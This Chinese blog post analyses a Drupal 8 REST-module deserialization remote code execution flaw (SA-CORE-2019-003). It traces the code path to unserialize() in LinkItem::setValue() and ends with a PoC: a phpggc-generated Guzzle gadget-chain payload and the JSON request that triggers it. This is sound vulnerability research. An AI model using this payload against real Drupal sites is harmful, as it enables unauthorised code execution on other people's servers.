---
title: SA-CORE-2019-003 Drupal 内核远程代码执行漏洞分析
date: 2019-02-22 22:19:04
tags: [vul,sec,Drupal]
categories: Security
---

<script src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js"></script>

### 0x01 概述

https://www.drupal.org/sa-core-2019-003

### 0x02 影响版本

- Drupal 8.6.x < 8.6.10
- Drupal 8.5.x < 8.5.11

影响条件

- 站点启用了`Drupal 8`核心`RESTful` Web服务`(rest)`模块，并允许`PATCH`或`POST`请求
- 站点启用了另一个`Web`服务模块，如`Drupal 8`中的`JSON:API`，或`Drupal 7`中的`Services`或`RESTful Web Services`

### 0x03 Web Services

Drupal框架的`RESTful` Web服务是为了更方便地访问Drupal站点的资源，支持常规的api请求，如GET / POST / PATCH / DELETE（出于一些原因不支持PUT ）

更详细的介绍可以参考 https://www.drupal.org/docs/8/core/modules/rest/overview

这个漏洞影响REST Web Services，所以首先在Drupal 8中开启rest服务

1. 下载[REST UI](https://www.drupal.org/project/restui)并解压至`core/modules/`目录
2. 在`admin-config-extend`勾选Web services中的`RESTful Web Services`和`REST UI`并安装，drupal会自动安装`Serialization` ，最好也安装`HAL`扩展，后续会使用`hal_json`数据格式

> HAL(Hypertext Application Language)是一个简单的API数据格式.它以xml和json为基础，让API变的可读性更高，并且具有discoverable的特性.当我们拿到HAL API返回的数据时，我们将会很容易根据当前数据查找与其相关的数据。在Micro Service API设计中，倾向于采用HAL这种类型的数据交换格式.
>
> HAL的出现，主要弥补plain json在API交互中的不足.让plain json更具有描述性，更具有导航性. 

3. 开启权限。在`admin-config-services-rest`开启匿名用户注册权限

   ![](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190222161612.png)

### 0x04 漏洞分析

根据补丁位置判断漏洞点在`unserialize`部分，因此这是一个反序列化漏洞。补丁主要修复了`core/modules/link/src/Plugin/Field/FieldType/LinkItem.php`和`core/lib/Drupal/Core/Field/Plugin/Field/FieldType/MapItem.php`两个文件，这两处应该都是能触发的，这里选择`LinkItem`进行分析

![](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190222160822.png)

![](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190222160859.png)

看一下`setValue()`方法

![](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190222161825.png)

可以看到简单判断了`$values['options']`后直接进行了反序列化，没有进行数据合法性校验，如果能够控制`$values['options']`就能直接触发漏洞

接下来梳理一下数据传递过程，以及如何进入到`setValue()`方法

通过rest接口注册用户时，发送的数据包类似这个样子

![](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190222164151.png)

(图片来源：https://areatype.com/blog/register-user-drupal-8-rest-api)

在进入`drupal`后，由`RequestHandler->handle()`方法处理请求，进入`deserialize()`方法，然后调用`$this->serializer->denormalize()`反序列化出相应的类，此时的`$unserialized`为`Serializer`类

![](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190222171019.png)

![](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190222171158.png)

随后调用`Serializer->denormalize()`方法，在该方法中首先通过`getDenormalizer()`获得一个匹配的`denormalizer`，才能进行后续的`denormalize()`操作，匹配的过程则是和当前类的`supportedInterfaceOrClass`变量比较，返回最终可以进行`denormalize()`操作的类

```php
if ($normalizer = $this->getDenormalizer($data, $type, $format, $context)) {
    return $normalizer->denormalize($data, $type, $format, $context);
}
```

此处跟入比较深，可以略过，总之返回匹配的类是`ContentEntityNormalizer`，跟进它的`denormalize()`方法

```php
$typed_data_ids = $this->getTypedDataIds($data['_links']['type'], $context);
$entity_type = $this->getEntityTypeDefinition($typed_data_ids['entity_type']);
```

这个方法中根据 `_links.type` 的值取出`typed data IDs`，`_links.type` 值即是`post json`部分的
`"type": {
      "href": "http://127.0.0.1/drupal-8.6.5/rest/type/user/user"
}`
      值，这个值决定了后面获取到的`Entity`实体，通过`getTypeInternalIds()`方法取出所有预定义的类型并返回相应的`URI`，然后才获取对应的实体类型定义

![](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190222173004.png)

接着会调用这个实体的`denormalizeFieldData()`方法，在`denormalizeFieldData()`中调用相应的`denormalize()`方法，最终调用到这个`field_item`的`setValue()`。因此为了触发到存在漏洞的`setValue()`，我们需要让`field_item`为`LinkItem`类或者`MapItem`类，这个赋值过程在获取到相应实体后的`getStorage()->create()`过程：

```php
$entity = $this->entityManager->getStorage($typed_data_ids['entity_type'])->create($values);
```

调用流程`create()->doCreate()->initFieldValues()`，此时的调用栈是这样的：

![](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190223102241.png)



现在的问题就是找到相应的`Entity`，在其中实体化了`LinkItem`类或`MapItem`类，通过查找，在`core/modules`中这样的类有两个，`Shortcut`和`MenuLinkContent`，这里选择`MenuLinkContent`来触发，此时的`_links.type`为`http://127.0.0.1/drupal-8.6.5/rest/type/menu_link_content/menu_link_conten`

![](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190223103404.png)

因此最后的数据包类似这个样子，注意`link`必须为数组

```
{
  "link": [
    {
      "options": payload
    }
  ],
  "_links": {
    "type": {
      "href": "http://127.0.0.1/drupal-8.6.5/rest/type/menu_link_content/menu_link_content"
    }
  }
}
```

发送数据包成功触发到`setValue()`

![](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190223103837.png)

接下来就是寻找内置的风险类了，进入`setValue()`后通过`unserialize()`执行代码。

### 0x05 PoC

在之前介绍`phpggc`工具的时候总结了`Drupal`中存在风险的三个类，分别可以导致远程代码执行、任意文件写入和任意文件删除，这三个类分别是

- `FnStream`
- `FileCookieJar`
- `WindowsPipes`

具体参考：[由phpggc理解php反序列化漏洞](https://kylingit.com/blog/由phpggc理解php反序列化漏洞/)

同样地，借助`phpggc`直接生成序列化数据：

```bash
root@localhost:/opt/phpggc# ./phpggc guzzle/rce1 assert 'phpinfo()' -j
"O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";s:9:\"phpinfo()\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000stack\";a:1:{i:0;a:1:{i:0;s:6:\"assert\";}}s:31:\"\u0000GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\"resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}"
```

发送payload

![](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190223111019.png)

### 0x06 总结

这个漏洞触发点并不复杂，但是调用链相当深，利用条件则是开启了`REST Web services`，并且允许用户通过`rest api`注册，在一些功能比较齐全的站点或者方便插件调用时可能会开启，影响面减小了不少，但并不影响这依然是个非常巧妙的漏洞，也进一步说明了开发时考虑不周全的话，风险点就在那里，被利用只是时间问题。





<script>pangu.spacingPage();</script>